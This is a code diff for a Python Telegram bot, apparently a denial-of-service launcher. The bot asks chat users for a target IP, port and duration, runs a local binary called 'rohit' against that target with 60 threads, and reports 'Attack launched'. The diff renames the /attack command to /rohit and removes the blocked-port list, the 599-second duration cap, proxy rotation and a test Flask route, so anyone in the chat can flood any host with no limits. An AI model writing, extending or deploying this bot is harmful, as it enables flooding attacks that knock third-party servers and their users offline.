@@ -2,86 +2,61 @@ import os
 import telebot
 import logging
 import subprocess
-import random
 import time
-import asyncio
 from threading import Thread
 from flask import Flask
-from cryptography.fernet import Fernet
 
 # Configuration
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")  # Fetch token from environment variable
 if not TOKEN:
     raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set!")
 bot = telebot.TeleBot(TOKEN)
-CHANNEL_ID = -1002188746287
 
 # Logging
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 
-REQUEST_INTERVAL = 1
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+THREAD_COUNT = 60  # Fixed thread count
 
-# Asyncio loop
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
-
-# Proxy Update
-def update_proxy():
-    proxy_list = [
-        "https://43.134.234.74:443", "https://175.101.18.21:5678",
-        "https://80.78.23.49:1080"
-    ]
-    proxy = random.choice(proxy_list)
-    telebot.apihelper.proxy = {'https': proxy}
-    logging.info("Proxy updated successfully.")
-
-@bot.message_handler(commands=['update_proxy'])
-def update_proxy_command(message):
-    chat_id = message.chat.id
+# Function to execute the binary
+def run_rohit_binary(ip, port, duration):
     try:
-        update_proxy()
-        bot.send_message(chat_id, "Proxy updated successfully.")
-    except Exception as e:
-        bot.send_message(chat_id, f"Failed to update proxy: {e}")
+        # Command to execute binary with given arguments
+        command = ["./rohit", ip, str(port), str(duration), str(THREAD_COUNT)]
+        subprocess.run(command, check=True)
+        logging.info(f"Executed binary with: {command}")
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Binary execution failed: {e}")
+        raise e
 
-# Binary Runner
-def run_binary(ip, port, duration):
+# Command handler for /rohit
+@bot.message_handler(commands=['rohit'])
+def handle_rohit_command(message):
+    bot.send_message(message.chat.id, "*Provide the target IP, port, and duration.*\nFormat: `IP PORT DURATION`", parse_mode='Markdown')
+    bot.register_next_step_handler(message, process_rohit_command)
+
+def process_rohit_command(message):
     try:
-        subprocess.run(["./rohit", ip, str(port), str(duration), '100'], check=True)
-    except Exception as e:
-        logging.error(f"Error running binary: {e}")
-
-@bot.message_handler(commands=['attack'])
-def handle_attack_command(message):
-    bot.send_message(message.chat.id, "*💣 Ready to launch an attack?*\nProvide the target IP, port, and duration in seconds.", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_command)
-
-def process_attack_command(message):
-    try:
+        # Parse the user input
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "Invalid format. Use: `/attack IP PORT DURATION`", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "Invalid format. Use: `IP PORT DURATION`", parse_mode='Markdown')
             return
 
-        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"Port {target_port} is blocked.", parse_mode='Markdown')
-            return
-        if duration >= 600:
-            bot.send_message(message.chat.id, "Maximum duration is 599 seconds.", parse_mode='Markdown')
-            return
+        # Extract IP, port, and duration
+        target_ip = args[0]
+        target_port = int(args[1])
+        duration = int(args[2])
 
-        run_binary(target_ip, target_port, duration)
-        bot.send_message(message.chat.id, f"Attack launched on {target_ip}:{target_port} for {duration} seconds!", parse_mode='Markdown')
-
+        # Run the binary
+        run_rohit_binary(target_ip, target_port, duration)
+        bot.send_message(message.chat.id, f"Attack launched on {target_ip}:{target_port} for {duration} seconds with {THREAD_COUNT} threads!", parse_mode='Markdown')
     except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
+        bot.send_message(message.chat.id, f"Error: {e}", parse_mode='Markdown')
+        logging.error(f"Error in /rohit command: {e}")
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
-    bot.send_message(message.chat.id, "Use `/attack IP PORT DURATION` to launch an attack. `/help` for assistance.", parse_mode='Markdown')
+    bot.send_message(message.chat.id, "Commands:\n`/rohit IP PORT DURATION` - Launch attack using the rohit binary.\n`/help` - Show this message.", parse_mode='Markdown')
 
 # Flask app
 app = Flask(__name__)
@@ -90,28 +65,16 @@ app = Flask(__name__)
 def hello_world():
     return "Hello, World!"
 
-@app.route('/run_c_code')
-def run_c_code():
-    result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True)
-    return result.stdout
-
 # Main function
 if __name__ == '__main__':
-    # Get PORT from environment variable (default is 5000)
-    PORT = int(os.getenv("PORT", 5000))
-
-    # Start asyncio thread
-    asyncio_thread = Thread(target=lambda: asyncio.run(start_asyncio_loop()), daemon=True)
-    asyncio_thread.start()
-
     # Start Flask app in a separate thread
-    flask_thread = Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": PORT}, daemon=True)
+    flask_thread = Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000}, daemon=True)
     flask_thread.start()
 
-    logging.info(f"Starting Telegram bot and Flask app on port {PORT}...")
+    logging.info("Starting Telegram bot...")
     while True:
         try:
             bot.polling(none_stop=True)
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
-        time.sleep(REQUEST_INTERVAL)
+        time.sleep(1)
